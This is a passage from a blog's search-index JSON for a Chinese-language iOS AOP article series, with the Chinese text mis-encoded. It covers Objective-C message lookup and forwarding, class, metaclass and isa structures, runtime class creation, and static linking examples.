ä¸­å·²å®ç°ï¼‰ï¼Œè¯¥è§£æå™¨æ–¹æ³•åŠ¨æ€ä¸ºå®ä¾‹æ–¹æ³•çš„ SEL æä¾› IMPï¼Œå¦‚æœæ‰¾åˆ°æ–¹æ³•å¹¶æ·»åŠ åˆ° receiver ä¸­è¿”å› trueã€‚è§£ææˆåŠŸéœ€è¦é‡æ–°è¿›è¡Œæ–¹æ³•æŸ¥æ‰¾ä»¥ä¿éšœè¿”å› IMPã€‚ ","date":"2021-03-15","objectID":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html:3:3","tags":["iOS","AOP"],"title":"æ–¹æ³•æŸ¥æ‰¾å’Œæ¶ˆæ¯è½¬å‘","uri":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html"},{"categories":["iOS"],"content":"3.4 é‡æ–°æ‰§è¡ŒæŸ¥æ‰¾æµç¨‹ static NEVER_INLINE IMP resolveMethod_locked(id inst, SEL sel, Class cls, int behavior) { ... // chances are that calling the resolver have populated the cache // so attempt using it return lookUpImpOrForwardTryCache(inst, sel, cls, behavior); } IMP lookUpImpOrForwardTryCache(id inst, SEL sel, Class cls, int behavior) { return _lookUpImpTryCache(inst, sel, cls, behavior); } static IMP _lookUpImpTryCache(id inst, SEL sel, Class cls, int behavior) { ... if (slowpath(imp == NULL)) { return lookUpImpOrForward(inst, sel, cls, behavior); } ... } æœ€ç»ˆä¼šå†æ‰§è¡Œ lookUpImpOrForward é‡èµ°æŸ¥æ‰¾æµç¨‹ã€‚ ","date":"2021-03-15","objectID":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html:3:4","tags":["iOS","AOP"],"title":"æ–¹æ³•æŸ¥æ‰¾å’Œæ¶ˆæ¯è½¬å‘","uri":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html"},{"categories":["iOS"],"content":"3.5 æ¶ˆæ¯è½¬å‘ å¦‚æœä»¥ä¸Šæµç¨‹éƒ½æ²¡æœ‰æ‰¾åˆ°æ–¹æ³• IMPï¼Œåˆ™è¿›å…¥æ¶ˆæ¯è½¬å‘æµç¨‹ï¼Œè¿™ä¸ªæµç¨‹åˆè¿›å…¥åˆ°æ±‡ç¼–ä»£ç ä¸­ const IMP forward_imp = (IMP)_objc_msgForward_impcache; // No implementation found, and method resolver didn't help. // Use forwarding. imp = forward_imp; ","date":"2021-03-15","objectID":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html:3:5","tags":["iOS","AOP"],"title":"æ–¹æ³•æŸ¥æ‰¾å’Œæ¶ˆæ¯è½¬å‘","uri":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html"},{"categories":["iOS"],"content":"4. æ¶ˆæ¯è½¬å‘åˆ†æ /******************************************************************** * * id _objc_msgForward(id self, SEL _cmd,...); * * _objc_msgForward is the externally-callable * function returned by things like method_getImplementation(). * _objc_msgForward_impcache is the function pointer actually stored in * method caches. * ********************************************************************/ STATIC_ENTRY __objc_msgForward_impcache // No stret specialization. b __objc_msgForward END_ENTRY __objc_msgForward_impcache ENTRY __objc_msgForward adrp x17, __objc_forward_handler@PAGE ldr p17, [x17, __objc_forward_handler@PAGEOFF] TailCallFunctionPointer x17 END_ENTRY __objc_msgForward void *_objc_forward_handler = (void*)objc_defaultForwardHandler; è¿™é‡Œå…¶å®è·Ÿä¸ä¸‹å»äº†ï¼ŒæŸ¥é˜…èµ„æ–™å‘ç°è¿™é‡Œæœ‰ä¸ªå°æŠ€å·§ï¼Œå¯ä»¥é€šè¿‡ instrumentObjcMessageSends æ‰“å¼€ logï¼Œå¹¶ä¸”ä¼šä¿å­˜åœ¨ /tmp/msgSends-%d è·¯å¾„æ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬åœ¨ Demo ä¸­æ·»åŠ ä»£ç ï¼š æŸ¥çœ‹æ—¥å¿—æ–‡ä»¶ï¼š Student Student resolveInstanceMethod: Student Student resolveInstanceMethod: Student NSObject forwardingTargetForSelector: Student NSObject forwardingTargetForSelector: Student Student methodSignatureForSelector: Student Student methodSignatureForSelector: ","date":"2021-03-15","objectID":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html:4:0","tags":["iOS","AOP"],"title":"æ–¹æ³•æŸ¥æ‰¾å’Œæ¶ˆæ¯è½¬å‘","uri":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html"},{"categories":["iOS"],"content":"4.1 forwardingTargetForSelector + (id)forwardingTargetForSelector:(SEL)sel { return nil; } - (id)forwardingTargetForSelector:(SEL)sel { return nil; } æˆ‘ä»¬çœ‹ä¸‹å®˜æ–¹æ¥å£æè¿°ï¼š If an object implements (or inherits) this method, and returns a non-nil (and non-self) result, that returned object is used as the new receiver object and the message dispatch resumes to that new object. (Obviously if you return self from this method, the code would just fall into an infinite loop.) If you implement this method in a non-root class, if your class has nothing to return for the given selector then you should return the result of invoking superâ€™s implementation. This method gives an object a chance to redirect an unknown message sent to it before the much more expensive forwardInvocation: machinery takes over. This is useful when you simply want to redirect messages to another object and can be an order of magnitude faster than regular forwarding. It is not useful where the goal of the forwarding is to capture the NSInvocation, or manipulate the arguments or return value during the forwarding. â€œå½“æ‚¨åªæƒ³å°†æ¶ˆæ¯é‡å®šå‘åˆ°å¦ä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶ä¸”æ¯”å¸¸è§„è½¬å‘å¿«ä¸€ä¸ªæ•°é‡çº§æ—¶ï¼Œæ­¤åŠŸèƒ½å¾ˆæœ‰ç”¨â€ æ¥ç ”ç©¶ä¸‹å¦‚ä½•ä½¿ç”¨ï¼Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ª Teacher ç±»ï¼Œä½†ä¸ç»§æ‰¿ Personï¼Œé‚£æˆ‘ä»¬æƒ³è®© Teacher è°ƒç”¨ Person çš„ sleep æ–¹æ³•ï¼Œé€šè¿‡å¿«é€Ÿè½¬å‘åº”è¯¥å¦‚ä½•å®ç°ï¼š // Teacher.m @implementation Teacher - (void)teach { NSLog(@\"I am teaching\"); } - (id)forwardingTargetForSelector:(SEL)aSelector { NSLog(@\"%s\", __func__); Person *p = [[Person alloc] init]; if ([p respondsToSelector: aSelector]) { return p; } return [super forwardingTargetForSelector: aSelector]; } @end // main.m ä¸­å³å¯å®ç° Teacher è°ƒç”¨ sleep Teacher *t = [[Teacher alloc] init]; [t performSelector:@selector(sleep)]; ","date":"2021-03-15","objectID":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html:4:1","tags":["iOS","AOP"],"title":"æ–¹æ³•æŸ¥æ‰¾å’Œæ¶ˆæ¯è½¬å‘","uri":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html"},{"categories":["iOS"],"content":"4.2 methodSignatureForSelector ä¹Ÿæ²¡æœ‰å…·ä½“å®ç°ï¼ŒåŒæ ·çœ‹ä¸‹æ–‡æ¡£ This method is used in the implementation of protocols. This method is also used in situations where an NSInvocation object must be created, such as during message forwarding. If your object maintains a delegate or is capable of handling messages that it does not directly implement, you should override this method to return an appropriate method signature. â€œç”¨äº NSInvocation å¿…é¡»åˆ›å»ºå¯¹è±¡çš„æƒ…å†µä¸‹ï¼Œä¾‹å¦‚åœ¨æ¶ˆæ¯è½¬å‘æœŸé—´â€ æ¥ç€ä¼šè°ƒç”¨ forwardInvocation: æ–¹æ³•è¿›è¡Œæ¶ˆæ¯è½¬å‘ã€‚ åŒæ ·ï¼Œæˆ‘ä»¬æƒ³å®ç° forwardingTargetForSelector ä¸­å±•ç¤ºçš„é‚£ç§èƒ½åŠ›ï¼Œçœ‹çœ‹åˆ©ç”¨ methodSignatureForSelector + forwardInvocation å¦‚ä½•code. æˆ‘ä»¬ç»§ç»­åœ¨ Teacher ç±»ä¸­æ–½åŠ é­”æ³•ï¼š // Teacher.m @implementation Teacher - (NSMethodSignature *)methodSignatureForSelector:(SEL)aSelector { NSLog(@\"%s\", __func__); if (aSelector == @selector(walk)) { // è·å– SEL æ–¹æ³•ç­¾å NSMethodSignature *sig = [[Person new] methodSignatureForSelector:aSelector]; return sig; } return [super methodSignatureForSelector:aSelector]; } - (void)forwardInvocation:(NSInvocation *)anInvocation { NSLog(@\"%@\", anInvocation); // è·å– SEL æ¶ˆæ¯ SEL s = [anInvocation selector]; // å®ä¾‹åŒ– Person ç±» Person *p = [[Person alloc] init]; // å‘æ¥æ”¶å¯¹è±¡ p å‘é€ SEL æ¶ˆæ¯ if ([p respondsToSelector:s]) { [anInvocation invokeWithTarget:p]; } else { [super forwardInvocation:anInvocation]; } } @end // main.m ä¸­å®ç° Teacher è°ƒç”¨ walk // methodSignatureForSelector + forwardInvocation [t performSelector:@selector(walk)]; Warning è¯·æ³¨é‡Šæ‰4.1ä¸­çš„ - (id)forwardingTargetForSelector:(SEL)aSelector å®ç°ï¼Œå¦åˆ™ä¼šä¼˜å…ˆæ‰§è¡Œå¿«é€Ÿè½¬å‘æœºåˆ¶è€Œä¸ä¼šèµ°åˆ° methodSignatureForSelector ä¸­ã€‚ è¿™ä¸ªæ¶ˆæ¯è½¬å‘åŸç†æˆ‘ä»¬åç»­ä¼šåœ¨ä¸€äº›ç»å…¸çš„ AOP æ¡†æ¶åˆ†æä¸­çœ‹åˆ°å…¶åˆ©ç”¨ã€‚ ","date":"2021-03-15","objectID":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html:4:2","tags":["iOS","AOP"],"title":"æ–¹æ³•æŸ¥æ‰¾å’Œæ¶ˆæ¯è½¬å‘","uri":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html"},{"categories":["iOS"],"content":"æ€»ç»“ æ•´ä¸ªæµç¨‹åŒ…æ‹¬ ç¼“å­˜æŸ¥æ‰¾ -\u003e æœ¬ç±»çˆ¶ç±»æ–¹æ³•æŸ¥æ‰¾ -\u003e åŠ¨æ€æ–¹æ³•è§£æ -\u003e å¿«é€Ÿæ¶ˆæ¯è½¬å‘ -\u003e æ…¢é€Ÿæ¶ˆæ¯è½¬å‘ã€‚è€Œå…¶ä¸­åŠ¨æ€æ–¹æ³•è§£æã€å¿«é€Ÿæ¶ˆæ¯è½¬å‘å’Œæ…¢é€Ÿæ¶ˆæ¯è½¬å‘å°±æ˜¯ ğŸ ç»™çš„é¢å¤–ä¸‰æ¬¡å¯»æ‰¾ IMP çš„æœºä¼šã€‚ è‡³æ­¤ obj_msgSend çš„æ•´ä¸ªæµç¨‹æ¢³ç†å®Œæ¯•ï¼Œå…¶ä¸­å¾ˆå¤šç»†èŠ‚å»ºè®®è¯»è€…è‡ªå·±å»é˜…è¯»æ¢å¯»ã€‚ ","date":"2021-03-15","objectID":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html:5:0","tags":["iOS","AOP"],"title":"æ–¹æ³•æŸ¥æ‰¾å’Œæ¶ˆæ¯è½¬å‘","uri":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html"},{"categories":["iOS"],"content":" iOS AOPæ–‡ç« ç³»åˆ— å‰å¯¼çŸ¥è¯†ï¼š Mach-Oæ–‡ä»¶ç»“æ„åˆ†æ é™æ€é“¾æ¥\u0026åŠ¨æ€é“¾æ¥ OCæ–¹æ³•\u0026OCç±»\u0026OCå¯¹è±¡ æ–¹æ³•æŸ¥æ‰¾å’Œæ¶ˆæ¯è½¬å‘ AOPæ¡†æ¶ï¼š Method Swizzling Fishhook Apsects NSProxy AOP Tip æºç åˆ†æç¯å¢ƒï¼šobjc4-818.2 ","date":"2021-03-10","objectID":"/posts/oc%E6%96%B9%E6%B3%95oc%E7%B1%BBoc%E5%AF%B9%E8%B1%A1.html:0:0","tags":["iOS","AOP"],"title":"OCæ–¹æ³•\u0026OCç±»\u0026OCå¯¹è±¡","uri":"/posts/oc%E6%96%B9%E6%B3%95oc%E7%B1%BBoc%E5%AF%B9%E8%B1%A1.html"},{"categories":["iOS"],"content":"OCæ–¹æ³• é€šè¿‡ä¹‹å‰çš„æ–‡ç«  Mach-Oæ–‡ä»¶ç»“æ„åˆ†æ æˆ‘ä»¬å¾—çŸ¥OCæ–¹æ³•åœ¨ç¼–è¯‘æ—¶è°ƒç”¨äº† objc_msgSend å‡½æ•° int main(int argc, const char * argv[]) { @autoreleasepool { // insert code here... NSLog(@\"Hello, World!\"); Person *p = [[Person alloc] init]; [p walk]; [p ill]; [p sleep]; run(); } return 0; } clang -rewrite-objc main.m -o main.cpp int main(int argc, const char * argv[]) { /* @autoreleasepool */ { __AtAutoreleasePool __autoreleasepool; NSLog((NSString *)\u0026__NSConstantStringImpl__var_folders_16_fnqk_6_50_z264j18b83nb9w0000gp_T_main_c8b264_mi_1); Person *p = ((Person *(*)(id, SEL))(void *)objc_msgSend)((id)((Person *(*)(id, SEL))(void *)objc_msgSend)((id)objc_getClass(\"Person\"), sel_registerName(\"alloc\")), sel_registerName(\"init\")); ((void (*)(id, SEL))(void *)objc_msgSend)((id)p, sel_registerName(\"walk\")); ((void (*)(id, SEL))(void *)objc_msgSend)((id)p, sel_registerName(\"ill\")); ((void (*)(id, SEL))(void *)objc_msgSend)((id)p, sel_registerName(\"sleep\")); run(); } return 0; } obj_msgSend å‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•° idã€SELï¼Œid æ˜¯æ“ä½œå¯¹è±¡ï¼ŒSEL åˆ™é€šè¿‡æ¶ˆæ¯å‘é€æœºåˆ¶æŸ¥æ‰¾å¯¹åº” impã€‚ å› æ­¤OCæ–¹æ³•æœ¬è´¨å°±æ˜¯è°ƒç”¨ obj_msgSend å‡½æ•°ã€‚ å…³äº obj_msgSend çš„æ¶ˆæ¯æŸ¥æ‰¾å’Œæ¶ˆæ¯å‘é€åœ¨åç»­æ–‡ç« ä¸­è¯¦ç»†ä»‹ç»ã€‚ ","date":"2021-03-10","objectID":"/posts/oc%E6%96%B9%E6%B3%95oc%E7%B1%BBoc%E5%AF%B9%E8%B1%A1.html:1:0","tags":["iOS","AOP"],"title":"OCæ–¹æ³•\u0026OCç±»\u0026OCå¯¹è±¡","uri":"/posts/oc%E6%96%B9%E6%B3%95oc%E7%B1%BBoc%E5%AF%B9%E8%B1%A1.html"},{"categories":["iOS"],"content":"OCç±»/OCå¯¹è±¡ Person *p = [[Person alloc] init]; æˆ‘ä»¬åœ¨ main.cpp æ–‡ä»¶ä»¥åŠæºç ä¸­çœ‹ä¸‹ Person ç±»ï¼ˆclassï¼‰å’Œ p å¯¹è±¡ï¼ˆidï¼‰çš„ç»“æ„ä½“ // main.cpp struct Person_IMPL { struct NSObject_IMPL NSObject_IVARS; }; struct NSObject_IMPL { Class isa; }; typedef struct objc_class *Class; typedef struct objc_object *id; // objc-runtime-new.h struct objc_class : objc_object { // Class ISA; Class superclass; cache_t cache; // formerly cache pointer and vtable class_data_bits_t bits; // class_rw_t * plus custom rr/alloc flags class_rw_t *data() const { return bits.data(); } ... } // objc-private.h struct objc_object { private: isa_t isa; public: // ISA() assumes this is NOT a tagged pointer object Class ISA(bool authenticated = false); // rawISA() assumes this is NOT a tagged pointer object or a non pointer ISA Class rawISA(); // getIsa() allows this to be a tagged pointer object Class getIsa(); ... } Person ç±»æ˜¯ä¸€ä¸ª objc_class ç»“æ„ä½“ï¼Œè€Œ objc_class ç»§æ‰¿è‡ª objc_objectï¼Œè¯´æ˜ç±»æœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œç§°ä¹‹ä¸ºç±»å¯¹è±¡ã€‚ ç±»åŒ…å«: isa // ä¸ºäº†å†…å­˜ä¼˜åŒ–ï¼Œè®¾è®¡æˆ isa_t ç»“æ„ä½“ï¼ŒæŒ‡å‘å…ƒç±» superclass // çˆ¶ç±»æŒ‡é’ˆ cache // è¯¥ç±»çš„æ–¹æ³•ç¼“å­˜ bits // è¯¥ç±»çš„å…·ä½“ä¿¡æ¯ data // å­˜æ”¾ç±»çš„æ–¹æ³•ã€å±æ€§ã€åè®®ç­‰ä¿¡æ¯ é¦–å…ˆçœ‹ä¸‹ cache_t ç»“æ„ä½“ï¼Œä¸»è¦ä½œä¸ºå­˜å‚¨æ–¹æ³•ç¼“å­˜ï¼Œå…·ä½“åŸç†æˆ‘ä»¬åœ¨æ–¹æ³•ç¼“å­˜æŸ¥æ‰¾æ–‡ç« ä¸­è®²è§£ï¼š struct cache_t { ... public: mask_t mask() const; // ç¼“å­˜æ•°ç»„çš„å®¹é‡ä¸´ç•Œå€¼ struct bucket_t *buckets() const; // æ–¹æ³•ç¼“å­˜æ•°ç»„ Class cls() const; mask_t occupied() const; // ç¼“å­˜æ•°ç»„ä¸­å·²ç¼“å­˜æ–¹æ³•æ•°é‡ ... } struct bucket_t { private: #if __arm64__ explicit_atomic\u003cuintptr_t\u003e _imp; explicit_atomic\u003cSEL\u003e _sel; #else explicit_atomic\u003cSEL\u003e _sel; explicit_atomic\u003cuintptr_t\u003e _imp; #endif ... } å†çœ‹ä¸‹ class_data_bits_t ç»“æ„ä½“ï¼š struct class_data_bits_t { friend objc_class; // Values are the FAST_ flags above. uintptr_t bits; ... public: class_rw_t* data() const { return (class_rw_t *)(bits \u0026 FAST_DATA_MASK); } ... } struct class_rw_t { // Be warned that Symbolication knows the layout of this structure. uint32_t flags; uint16_t witness; #if SUPPORT_INDEXED_ISA uint16_t index; #endif explicit_atomic\u003cuintptr_t\u003e ro_or_rw_ext; Class firstSubclass; Class nextSiblingClass; ... public: ... const method_array_t methods() const { auto v = get_ro_or_rwe(); if (v.is\u003cclass_rw_ext_t *\u003e()) { return v.get\u003cclass_rw_ext_t *\u003e(\u0026ro_or_rw_ext)-\u003emethods; } else { return method_array_t{v.get\u003cconst class_ro_t *\u003e(\u0026ro_or_rw_ext)-\u003ebaseMethods()}; } } const property_array_t properties() const { auto v = get_ro_or_rwe(); if (v.is\u003cclass_rw_ext_t *\u003e()) { return v.get\u003cclass_rw_ext_t *\u003e(\u0026ro_or_rw_ext)-\u003eproperties; } else { return property_array_t{v.get\u003cconst class_ro_t *\u003e(\u0026ro_or_rw_ext)-\u003ebaseProperties}; } } const protocol_array_t protocols() const { auto v = get_ro_or_rwe(); if (v.is\u003cclass_rw_ext_t *\u003e()) { return v.get\u003cclass_rw_ext_t *\u003e(\u0026ro_or_rw_ext)-\u003eprotocols; } else { return protocol_array_t{v.get\u003cconst class_ro_t *\u003e(\u0026ro_or_rw_ext)-\u003ebaseProtocols}; } } }; å…¶ä¸­å³å­˜æ”¾ç€æ–¹æ³•åˆ—è¡¨ã€å±æ€§åˆ—è¡¨ã€åè®®åˆ—è¡¨ç­‰ Warning éœ€è¦æ³¨æ„ç±»å­˜æ”¾å¯¹è±¡æ–¹æ³•ï¼Œå…ƒç±»å­˜æ”¾ç±»æ–¹æ³• ç°åœ¨æˆ‘ä»¬å›å¤´çœ‹ä¸‹Mach-Oæ–‡ä»¶ç»“æ„åˆ†æä¸­ä»‹ç»çš„ Section64(__DATA,__objc_data) åˆ†å¸ƒï¼Œå­˜å‚¨çš„æ˜¯ objc_calss ç±»ç»“æ„ï¼Œæ˜¯ä¸æ˜¯ä¸€ç›®äº†ç„¶ï¼š è€Œå­˜å‚¨ä¸Section64(__DATA,__objc_const) çš„ class_rw_t ç»“æ„ä½“åˆ†å¸ƒä¹Ÿå¾—ä»¥éªŒè¯ã€‚ ","date":"2021-03-10","objectID":"/posts/oc%E6%96%B9%E6%B3%95oc%E7%B1%BBoc%E5%AF%B9%E8%B1%A1.html:2:0","tags":["iOS","AOP"],"title":"OCæ–¹æ³•\u0026OCç±»\u0026OCå¯¹è±¡","uri":"/posts/oc%E6%96%B9%E6%B3%95oc%E7%B1%BBoc%E5%AF%B9%E8%B1%A1.html"},{"categories":["iOS"],"content":"å…ƒç±»ï¼ˆmetaclassï¼‰ æ—¢ç„¶ç±»ä¹Ÿæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œé‚£ä¹ˆå®ƒä¸€å®šæ˜¯å…¶ä»–ç±»çš„å®ä¾‹ï¼Œé‚£ä¸ªç±»å°±æ˜¯å…ƒç±» (metaclass)ã€‚å…ƒç±»æ˜¯ç±»ï¼ˆå¯¹è±¡ï¼‰çš„æè¿°ï¼Œå°±åƒç±»æ˜¯æ™®é€šå®ä¾‹çš„æè¿°ä¸€æ ·ã€‚ç‰¹åˆ«çš„æ˜¯ï¼Œå…ƒç±»çš„æ–¹æ³•åˆ—è¡¨æ˜¯ç±»æ–¹æ³•ã€‚å½“ä½ å‘é€æ¶ˆæ¯ç»™ä¸€ä¸ªç±»ï¼Œobjc_msgSend ä¼šæŸ¥æ‰¾å…ƒç±»ï¼ˆå·²åŠå®ƒçš„çˆ¶ç±»ï¼‰çš„æ–¹æ³•åˆ—è¡¨å¹¶ç¡®å®šè°ƒç”¨çš„æ–¹æ³•ã€‚ å¯ä»¥ä»åˆ›å»ºç±»çš„è¿‡ç¨‹æ¥äº†è§£ä¸‹å…ƒç±»ï¼Œæˆ‘ä»¬ä¸º Person æ·»åŠ ä¸€ä¸ªå­ç±» Studentï¼š void StudyFunction(id self, SEL _cmd) { NSLog(@\"i am studing\"); } int main(int argc, const char * argv[]) { @autoreleasepool { Person *p = [[Person alloc] init]; p.age = 26; [p walk]; [p sleep]; run(); // ä¸ºclass pairåˆ†é…å†…å­˜ Class newClass = objc_allocateClassPair([Person class], \"Student\", 0); // ä¸ºæ–°ç±»æ·»åŠ æ–¹æ³• class_addMethod(newClass, @selector(study), (IMP)StudyFunction, \"v@:\"); // æ³¨å†Œç±» objc_registerClassPair(newClass); // åˆå§‹åŒ–å®ä¾‹å¯¹è±¡ id s = [[newClass alloc] init]; // è°ƒç”¨æœ¬ç±» study æ–¹æ³• [s performSelector:@selector(study)]; // è°ƒç”¨çˆ¶ç±» sleep æ–¹æ³• [s sleep]; } return 0; } Student å®ä¾‹å¯¹è±¡è°ƒç”¨ Person ç±»æ–¹æ³•ï¼Œä¼šæŸ¥æ‰¾è‡ªå·±çš„ç±»å’Œçˆ¶ç±»çš„æ–¹æ³•åˆ—è¡¨ï¼š æˆ‘ä»¬çœ‹ä¸€ä¸‹ objc_allocateClassPair æºç ï¼š Class objc_initializeClassPair(Class superclass, const char *name, Class cls, Class meta) { // Fail if the class name is in use. if (look_up_class(name, NO, NO)) return nil; mutex_locker_t lock(runtimeLock); // Fail if the class name is in use. // Fail if the superclass isn't kosher. if (getClassExceptSomeSwift(name) || !verifySuperclass(superclass, true/*rootOK*/)) { return nil; } objc_initializeClassPair_internal(superclass, name, cls, meta); return cls; } static void objc_initializeClassPair_internal(Class superclass, const char *name, Class cls, Class meta) { ... class_ro_t *cls_ro_w, *meta_ro_w; class_rw_t *cls_rw_w, *meta_rw_w; cls_rw_w = objc::zalloc\u003cclass_rw_t\u003e(); meta_rw_w = objc::zalloc\u003cclass_rw_t\u003e(); cls_ro_w = (class_ro_t *)calloc(sizeof(class_ro_t), 1); meta_ro_w = (class_ro_t *)calloc(sizeof(class_ro_t), 1); ... // Set basic info ... // Connect to superclasses and metaclasses cls-\u003einitClassIsa(meta); // 0 if (superclass) { meta-\u003einitClassIsa(superclass-\u003eISA()-\u003eISA()); // 1 cls-\u003esetSuperclass(superclass); // 2 meta-\u003esetSuperclass(superclass-\u003eISA()); // 3 addSubclass(superclass, cls); // 4 addSubclass(superclass-\u003eISA(), meta); // 5 } else { meta-\u003einitClassIsa(meta); cls-\u003esetSuperclass(Nil); meta-\u003esetSuperclass(cls); addRootClass(cls); addSubclass(cls, meta); } addClassTableEntry(cls); } åœ¨ objc_initializeClassPair_internal ä¸­åˆ†é…äº† class_ro_t / class_rw_t ç±»ç»“æ„ä½“ï¼Œè®¾ç½®ç±» flag ç­‰ç±»åŸºç¡€ä¿¡æ¯ï¼Œæœ€åå®ç°ç±» superclass å’Œ isa çš„æŒ‡å‘ã€‚å¯ä»¥ç”¨ä¸‹å›¾æ¥å±•ç¤ºé“¾æ¥è¿‡ç¨‹ï¼š ","date":"2021-03-10","objectID":"/posts/oc%E6%96%B9%E6%B3%95oc%E7%B1%BBoc%E5%AF%B9%E8%B1%A1.html:3:0","tags":["iOS","AOP"],"title":"OCæ–¹æ³•\u0026OCç±»\u0026OCå¯¹è±¡","uri":"/posts/oc%E6%96%B9%E6%B3%95oc%E7%B1%BBoc%E5%AF%B9%E8%B1%A1.html"},{"categories":["iOS"],"content":"isaæŒ‡é’ˆ é€šè¿‡å‰é¢åˆ†æï¼Œæ¯ä¸€ä¸ªå¯¹è±¡éƒ½ä»¥ä¸€ä¸ª isa æŒ‡é’ˆï¼Œå®é™…ä¸Š isa å°±æ˜¯å°†å¯¹è±¡ , ç±» , ä»¥åŠå…ƒç±»è¿æ¥èµ·æ¥ï¼Œåœ¨å®ä¾‹å¯¹è±¡ä¸­æŒ‡å‘ç±»å¯¹è±¡ï¼Œç±»å¯¹è±¡çš„ isa æŒ‡å‘å…ƒç±»ï¼Œå…ƒç±»çš„ isa æŒ‡å‘æ ¹å…ƒç±»ï¼Œæ ¹å…ƒç±»æŒ‡å‘è‡ªå·±ã€‚ è‡³äº isa çš„ä¼˜åŒ–ä¸åšè¿‡å¤šä»‹ç»ï¼Œè¯»è€…å¯è‡ªè¡ŒæŸ¥é˜…å­¦ä¹ ã€‚ ","date":"2021-03-10","objectID":"/posts/oc%E6%96%B9%E6%B3%95oc%E7%B1%BBoc%E5%AF%B9%E8%B1%A1.html:4:0","tags":["iOS","AOP"],"title":"OCæ–¹æ³•\u0026OCç±»\u0026OCå¯¹è±¡","uri":"/posts/oc%E6%96%B9%E6%B3%95oc%E7%B1%BBoc%E5%AF%B9%E8%B1%A1.html"},{"categories":["iOS"],"content":"å®ä¾‹å¯¹è±¡ ç»™ Person ç±»å¢åŠ ä¸€ä¸ª age å±æ€§ï¼Œdebug æŸ¥çœ‹ p å®ä¾‹å¯¹è±¡ï¼Œå‘ç°å®ä¾‹å¯¹è±¡åªæ‹·è´äº†ç±»çš„æˆå‘˜å˜é‡ï¼Œè€Œæ²¡æœ‰ç±»å®šä¹‰çš„æ–¹æ³•ã€‚ ","date":"2021-03-10","objectID":"/posts/oc%E6%96%B9%E6%B3%95oc%E7%B1%BBoc%E5%AF%B9%E8%B1%A1.html:5:0","tags":["iOS","AOP"],"title":"OCæ–¹æ³•\u0026OCç±»\u0026OCå¯¹è±¡","uri":"/posts/oc%E6%96%B9%E6%B3%95oc%E7%B1%BBoc%E5%AF%B9%E8%B1%A1.html"},{"categories":["iOS"],"content":" iOS AOPæ–‡ç« ç³»åˆ— å‰å¯¼çŸ¥è¯†ï¼š Mach-Oæ–‡ä»¶ç»“æ„åˆ†æ é™æ€é“¾æ¥\u0026åŠ¨æ€é“¾æ¥ OCæ–¹æ³•\u0026OCç±»\u0026OCå¯¹è±¡ æ–¹æ³•æŸ¥æ‰¾å’Œæ¶ˆæ¯è½¬å‘ AOPæ¡†æ¶ï¼š Method Swizzling Fishhook Apsects NSProxy AOP ","date":"2021-03-05","objectID":"/posts/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5.html:0:0","tags":["iOS","AOP"],"title":"é™æ€é“¾æ¥\u0026åŠ¨æ€é“¾æ¥","uri":"/posts/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5.html"},{"categories":["iOS"],"content":"é™æ€é“¾æ¥ è¿˜æ˜¯é€šè¿‡ ğŸŒ° æ¥åˆ†æï¼š âœ ios cat bar.c int global = 1; void fizz(int a) { global = a; } âœ ios cat main.c extern int global; void fizz(int a); int main() { fizz(100 + global); return 0; } ç¼–è¯‘é“¾æ¥ bar.c å’Œ main.c ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ main âœ ios xcrun -sdk iphoneos clang -c bar.c main.c -target arm64-apple-ios13.4 âœ ios xcrun -sdk iphoneos clang bar.o main.o -o main -target arm64-apple-ios13.4 æˆ‘ä»¬çœ‹ä¸‹é“¾æ¥å‰åç¬¦å·è¡¨çš„å˜åŒ–ï¼š âœ ios jtool -S bar.o 0000000000000000 T _fizz 0000000000000020 D _global âœ ios jtool -S main.o 0000000000000000 T _main U _fizz U _global âœ ios jtool -S main 0000000100000000 T __mh_execute_header 0000000100007f54 T _fizz 0000000100008000 D _global 0000000100007f74 T _main U dyld_stub_binder åœ¨é“¾æ¥å‰ bar.o ä¸­ 